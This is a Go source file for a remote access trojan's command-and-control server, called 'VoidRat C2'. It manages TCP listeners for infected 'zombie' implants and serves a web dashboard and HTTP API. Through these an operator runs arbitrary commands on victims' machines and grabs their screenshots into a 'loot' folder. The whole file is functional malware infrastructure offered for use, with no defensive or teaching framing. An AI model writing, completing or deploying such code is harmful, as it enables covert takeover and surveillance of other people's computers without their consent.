package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"sync"
	"time"
)

// Zombie represents a connected client implant
type Zombie struct {
	ID          int       `json:"id"`
	RemoteAddr  string    `json:"remoteAddr"`
	ConnectedAt time.Time `json:"connectedAt"`
	conn        net.Conn
	mu          sync.Mutex
}

// ServerState manages listeners and zombies
type ServerState struct {
	mu           sync.RWMutex
	listeners    map[int]net.Listener
	zombies      map[int]*Zombie
	nextZombieID int
}

var state = &ServerState{
	listeners:    make(map[int]net.Listener),
	zombies:      make(map[int]*Zombie),
	nextZombieID: 1,
}

// PNG standard trailer: 4 bytes length (0), "IEND", 4 bytes CRC
var pngTrailer = []byte{0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82}

func main() {
	httpPort := flag.Int("port", 2560, "HTTP C2 control API port")
	defaultListener := flag.Int("listen", 0, "Optional TCP listener port to open immediately")
	flag.Parse()

	// Ensure loot directory exists
	if err := os.MkdirAll("loot", 0755); err != nil {
		log.Printf("[-] Warning: Failed to create loot directory: %v", err)
	}

	if *defaultListener > 0 {
		if err := startTCPListener(*defaultListener); err != nil {
			log.Printf("[-] Failed to start initial TCP listener on :%d: %v", *defaultListener, err)
		} else {
			log.Printf("[+] Initial TCP listener active on :%d", *defaultListener)
		}
	}

	// Register API endpoints (matching VoidRat specification)
	http.HandleFunc("/newListener", handleNewListener)
	http.HandleFunc("/getListeners", handleGetListeners)
	http.HandleFunc("/stopListener", handleStopListener)
	http.HandleFunc("/getZombies", handleGetZombies)
	http.HandleFunc("/runCommand", handleRunCommand)
	http.HandleFunc("/screenshot", handleScreenshot)
	http.HandleFunc("/removeZombie", handleRemoveZombie)

	// Static loot files and Dashboard
	http.Handle("/loot/", http.StripPrefix("/loot/", http.FileServer(http.Dir("loot"))))
	http.HandleFunc("/", handleDashboard)

	addr := fmt.Sprintf(":%d", *httpPort)
	log.Printf("[*] VoidRat C2 Server listening on HTTP http://127.0.0.1%s", addr)
	log.Printf("[*] Open http://127.0.0.1%s in your browser for the Web Control Panel", addr)

	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("[-] Server failed: %v", err)
	}
}

// startTCPListener creates a new TCP listener on the specified port
func startTCPListener(port int) error {
	state.mu.Lock()
	defer state.mu.Unlock()

	if _, exists := state.listeners[port]; exists {
		return fmt.Errorf("listener on port %d already exists", port)
	}

	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return err
	}

	state.listeners[port] = ln

	go acceptLoop(ln, port)
	return nil
}

// acceptLoop handles incoming implant connections on a given listener
func acceptLoop(ln net.Listener, port int) {
	log.Printf("[+] TCP Listener started on port :%d", port)
	for {
		conn, err := ln.Accept()
		if err != nil {
			// Listener was closed
			log.Printf("[*] TCP Listener on port :%d closed", port)
			return
		}

		state.mu.Lock()
		zombieID := state.nextZombieID
		state.nextZombieID++

		zombie := &Zombie{
			ID:          zombieID,
			RemoteAddr:  conn.RemoteAddr().String(),
			ConnectedAt: time.Now(),
			conn:        conn,
		}
		state.zombies[zombieID] = zombie
		state.mu.Unlock()

		log.Printf("[+] New Zombie connected! ID: #%d (%s)", zombieID, zombie.RemoteAddr)
	}
}

// parseRequestHelper extracts JSON body or form/query values
func parseRequestHelper(r *http.Request) map[string]interface{} {
	result := make(map[string]interface{})

	// Try reading JSON body if available
	if r.Body != nil {
		bodyBytes, err := io.ReadAll(r.Body)
		if err == nil && len(bodyBytes) > 0 {
			var jsonMap map[string]interface{}
			if err := json.Unmarshal(bodyBytes, &jsonMap); err == nil {
				result = jsonMap
			}
		}
	}

	// Also parse query string or form data as fallbacks
	r.ParseForm()
	for k, v := range r.Form {
		if len(v) > 0 {
			if _, exists := result[k]; !exists {
				result[k] = v[0]
			}
		}
	}

	return result
}

func handleNewListener(w http.ResponseWriter, r *http.Request) {
	data := parseRequestHelper(r)
	var port int

	switch v := data["port"].(type) {
	case float64:
		port = int(v)
	case int:
		port = v
	case string:
		port, _ = strconv.Atoi(v)
	}

	if port <= 0 || port > 65535 {
		http.Error(w, `{"error": "Invalid or missing port"}`, http.StatusBadRequest)
		return
	}

	if err := startTCPListener(port); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusConflict)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status": "error",
			"error":  err.Error(),
		})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "ok",
		"port":   port,
	})
}

func handleGetListeners(w http.ResponseWriter, r *http.Request) {
	state.mu.RLock()
	ports := make([]int, 0, len(state.listeners))
	for p := range state.listeners {
		ports = append(ports, p)
	}
	state.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"listeners": ports,
	})
}

func handleStopListener(w http.ResponseWriter, r *http.Request) {
	data := parseRequestHelper(r)
	var port int
	switch v := data["port"].(type) {
	case float64:
		port = int(v)
	case int:
		port = v
	case string:
		port, _ = strconv.Atoi(v)
	}

	state.mu.Lock()
	ln, exists := state.listeners[port]
	if exists {
		ln.Close()
		delete(state.listeners, port)
	}
	state.mu.Unlock()

	if !exists {
		http.Error(w, `{"error": "Listener not found"}`, http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "stopped",
		"port":   port,
	})
}

func handleGetZombies(w http.ResponseWriter, r *http.Request) {
	state.mu.RLock()
	list := make([]*Zombie, 0, len(state.zombies))
	for _, z := range state.zombies {
		list = append(list, z)
	}
	state.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(list)
}

func handleRunCommand(w http.ResponseWriter, r *http.Request) {
	data := parseRequestHelper(r)
	var id int
	switch v := data["id"].(type) {
	case float64:
		id = int(v)
	case int:
		id = v
	case string:
		id, _ = strconv.Atoi(v)
	}

	cmdStr, _ := data["command"].(string)
	if id <= 0 || cmdStr == "" {
		http.Error(w, `{"error": "id and command are required"}`, http.StatusBadRequest)
		return
	}

	state.mu.RLock()
	zombie, exists := state.zombies[id]
	state.mu.RUnlock()

	if !exists {
		http.Error(w, `{"error": "Zombie not found"}`, http.StatusNotFound)
		return
	}

	zombie.mu.Lock()
	defer zombie.mu.Unlock()

	payload, _ := json.Marshal(map[string]string{
		"type":    "remote",
		"command": cmdStr,
	})
	payload = append(payload, '\n')

	zombie.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := zombie.conn.Write(payload); err != nil {
		// Connection dead
		state.mu.Lock()
		delete(state.zombies, id)
		state.mu.Unlock()
		zombie.conn.Close()
		http.Error(w, fmt.Sprintf(`{"error": "Failed to send command: %v"}`, err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "sent",
		"id":      id,
		"command": cmdStr,
	})
}

func handleScreenshot(w http.ResponseWriter, r *http.Request) {
	data := parseRequestHelper(r)
	var id int
	switch v := data["id"].(type) {
	case float64:
		id = int(v)
	case int:
		id = v
	case string:
		id, _ = strconv.Atoi(v)
	}

	if id <= 0 {
		http.Error(w, `{"error": "Valid zombie id is required"}`, http.StatusBadRequest)
		return
	}

	state.mu.RLock()
	zombie, exists := state.zombies[id]
	state.mu.RUnlock()

	if !exists {
		http.Error(w, `{"error": "Zombie not found"}`, http.StatusNotFound)
		return
	}

	zombie.mu.Lock()
	defer zombie.mu.Unlock()

	// 1. Send screenshot request
	payload := []byte("{\"type\":\"screenshot\"}\n")
	zombie.conn.SetDeadline(time.Now().Add(15 * time.Second))
	defer zombie.conn.SetDeadline(time.Time{})

	if _, err := zombie.conn.Write(payload); err != nil {
		http.Error(w, fmt.Sprintf(`{"error": "Failed to send screenshot command: %v"}`, err), http.StatusInternalServerError)
		return
	}

	// 2. Read 1 byte path length
	lenBuf := make([]byte, 1)
	if _, err := io.ReadFull(zombie.conn, lenBuf); err != nil {
		http.Error(w, fmt.Sprintf(`{"error": "Failed reading remote path length: %v"}`, err), http.StatusInternalServerError)
		return
	}
	pathLen := int(lenBuf[0])

	// 3. Read remote path string
	pathBuf := make([]byte, pathLen)
	if _, err := io.ReadFull(zombie.conn, pathBuf); err != nil {
		http.Error(w, fmt.Sprintf(`{"error": "Failed reading remote path: %v"}`, err), http.StatusInternalServerError)
		return
	}
	remotePath := string(pathBuf)

	// 4. Read image bytes until PNG trailer or deadline
	var imgData bytes.Buffer
	chunk := make([]byte, 2048)
	foundTrailer := false

	for {
		n, err := zombie.conn.Read(chunk)
		if n > 0 {
			imgData.Write(chunk[:n])
			if bytes.Contains(imgData.Bytes(), pngTrailer) {
				foundTrailer = true
				break
			}
		}
		if err != nil {
			break
		}
	}

	if imgData.Len() == 0 {
		http.Error(w, `{"error": "No image data received"}`, http.StatusInternalServerError)
		return
	}

	fileName := fmt.Sprintf("screenshot_zombie%d_%d.png", id, time.Now().Unix())
	filePath := filepath.Join("loot", fileName)

	if err := os.WriteFile(filePath, imgData.Bytes(), 0644); err != nil {
		http.Error(w, fmt.Sprintf(`{"error": "Failed saving screenshot: %v"}`, err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":     "success",
		"id":         id,
		"remotePath": remotePath,
		"file":       filePath,
		"url":        "/loot/" + fileName,
		"hasTrailer": foundTrailer,
	})
}

func handleRemoveZombie(w http.ResponseWriter, r *http.Request) {
	data := parseRequestHelper(r)
	var id int
	switch v := data["id"].(type) {
	case float64:
		id = int(v)
	case int:
		id = v
	case string:
		id, _ = strconv.Atoi(v)
	}

	state.mu.Lock()
	zombie, exists := state.zombies[id]
	if exists {
		zombie.conn.Close()
		delete(state.zombies, id)
	}
	state.mu.Unlock()

	if !exists {
		http.Error(w, `{"error": "Zombie not found"}`, http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "removed",
		"id":     id,
	})
}

func handleDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(dashboardHTML))
}

const dashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>VoidRat C2 Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    :root {
      --bg: #0f111a;
      --card: #181b28;
      --accent: #7928ca;
      --accent-glow: #ff0080;
      --text: #f0f2f5;
      --text-muted: #8c93a8;
      --border: #272c40;
      --green: #00f2fe;
      --red: #ff416c;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; }
    body { background: var(--bg); color: var(--text); padding: 24px; min-height: 100vh; }
    header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 16px; margin-bottom: 24px; }
    h1 { font-size: 24px; background: linear-gradient(90deg, #7928ca, #ff0080); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .badge { background: #20263d; border: 1px solid var(--accent); padding: 4px 10px; border-radius: 20px; font-size: 12px; color: var(--green); }
    .grid { display: grid; grid-template-columns: 1fr 2fr; gap: 24px; }
    .card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }
    .card h2 { font-size: 16px; margin-bottom: 16px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
    input, button { background: #23283b; border: 1px solid var(--border); color: var(--text); padding: 8px 12px; border-radius: 4px; font-size: 14px; }
    input:focus { outline: none; border-color: var(--accent); }
    button { cursor: pointer; transition: 0.2s; background: linear-gradient(135deg, var(--accent), #501b8a); border: none; font-weight: bold; }
    button:hover { opacity: 0.9; transform: translateY(-1px); }
    button.danger { background: linear-gradient(135deg, var(--red), #800); }
    table { width: 100%; border-collapse: collapse; margin-top: 12px; }
    th, td { text-align: left; padding: 10px; border-bottom: 1px solid var(--border); font-size: 13px; }
    th { color: var(--text-muted); }
    .actions { display: flex; gap: 6px; }
    .log-box { margin-top: 24px; background: #0b0d14; border: 1px solid var(--border); border-radius: 8px; padding: 16px; font-size: 13px; max-height: 200px; overflow-y: auto; color: #a0aec0; }
    .listeners-list { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
    .listener-pill { background: #23283b; border: 1px solid var(--border); padding: 6px 12px; border-radius: 4px; font-size: 13px; display: flex; align-items: center; gap: 8px; }
    .pill-btn { cursor: pointer; color: var(--red); font-weight: bold; }
  </style>
</head>
<body>
  <header>
    <h1>⚡ VoidRat C2 Command & Control</h1>
    <span class="badge" id="status-badge">System Active</span>
  </header>

  <div class="grid">
    <div class="card">
      <h2>TCP Listeners</h2>
      <div style="display: flex; gap: 8px;">
        <input type="number" id="listenerPort" placeholder="Port (e.g. 4444)" style="width: 100%;">
        <button onclick="addListener()">Start</button>
      </div>
      <div class="listeners-list" id="listenersContainer">Loading listeners...</div>
    </div>

    <div class="card">
      <h2>Connected Zombies (Implants)</h2>
      <table id="zombiesTable">
        <thead>
          <tr>
            <th>ID</th>
            <th>Remote Address</th>
            <th>Connected</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody id="zombiesBody">
          <tr><td colspan="4" style="text-align: center; color: var(--text-muted);">No zombies currently connected.</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <div class="log-box" id="activityLog">
    <div>[system] VoidRat C2 Web UI Initialized.</div>
  </div>

  <script>
    function log(msg) {
      const box = document.getElementById('activityLog');
      const row = document.createElement('div');
      row.innerText = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      box.appendChild(row);
      box.scrollTop = box.scrollHeight;
    }

    async function fetchListeners() {
      try {
        const res = await fetch('/getListeners');
        const data = await res.json();
        const container = document.getElementById('listenersContainer');
        container.innerHTML = '';
        if (data.listeners.length === 0) {
          container.innerHTML = '<span style="color: var(--text-muted); font-size: 13px;">No active listeners</span>';
          return;
        }
        data.listeners.forEach(port => {
          const div = document.createElement('div');
          div.className = 'listener-pill';
          div.innerHTML = 'Port :' + port + ' <span class="pill-btn" onclick="stopListener(' + port + ')">×</span>';
          container.appendChild(div);
        });
      } catch (e) {
        console.error(e);
      }
    }

    async function addListener() {
      const portInput = document.getElementById('listenerPort');
      const port = parseInt(portInput.value);
      if (!port) return alert('Please enter a valid port');
      try {
        const res = await fetch('/newListener', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ port })
        });
        const data = await res.json();
        if (data.status === 'ok') {
          log('Started TCP listener on port ' + port);
          portInput.value = '';
          fetchListeners();
        } else {
          alert('Error: ' + data.error);
        }
      } catch (e) {
        alert('Failed: ' + e);
      }
    }

    async function stopListener(port) {
      if (!confirm('Stop listener on port ' + port + '?')) return;
      try {
        await fetch('/stopListener', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ port })
        });
        log('Stopped listener on port ' + port);
        fetchListeners();
      } catch (e) {
        alert(e);
      }
    }

    async function fetchZombies() {
      try {
        const res = await fetch('/getZombies');
        const list = await res.json();
        const tbody = document.getElementById('zombiesBody');
        tbody.innerHTML = '';
        if (!list || list.length === 0) {
          tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text-muted);">No zombies currently connected.</td></tr>';
          return;
        }
        list.forEach(z => {
          const tr = document.createElement('tr');
          const connTime = new Date(z.connectedAt).toLocaleTimeString();
          tr.innerHTML = '<td>#' + z.id + '</td>' +
            '<td>' + z.remoteAddr + '</td>' +
            '<td>' + connTime + '</td>' +
            '<td class="actions">' +
              '<button onclick="runCommand(' + z.id + ')">Exec</button>' +
              '<button onclick="captureScreen(' + z.id + ')">Screen</button>' +
              '<button class="danger" onclick="removeZombie(' + z.id + ')">Disconnect</button>' +
            '</td>';
          tbody.appendChild(tr);
        });
      } catch (e) {
        console.error(e);
      }
    }

    async function runCommand(id) {
      const cmd = prompt('Enter command to execute on Zombie #' + id + ':');
      if (!cmd) return;
      try {
        log('Executing "' + cmd + '" on Zombie #' + id + '...');
        const res = await fetch('/runCommand', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ id, command: cmd })
        });
        const data = await res.json();
        log('Command dispatched to #' + id);
      } catch (e) {
        alert('Error: ' + e);
      }
    }

    async function captureScreen(id) {
      log('Requesting screenshot from Zombie #' + id + '...');
      try {
        const res = await fetch('/screenshot', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ id })
        });
        const data = await res.json();
        if (data.status === 'success') {
          log('Screenshot saved: ' + data.file);
          window.open(data.url, '_blank');
        } else {
          alert('Failed: ' + JSON.stringify(data));
        }
      } catch (e) {
        alert('Screenshot error: ' + e);
      }
    }

    async function removeZombie(id) {
      if (!confirm('Disconnect Zombie #' + id + '?')) return;
      try {
        await fetch('/removeZombie', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ id })
        });
        log('Zombie #' + id + ' removed.');
        fetchZombies();
      } catch (e) {
        alert(e);
      }
    }

    fetchListeners();
    fetchZombies();
    setInterval(fetchListeners, 5000);
    setInterval(fetchZombies, 3000);
  </script>
</body>
</html>
`
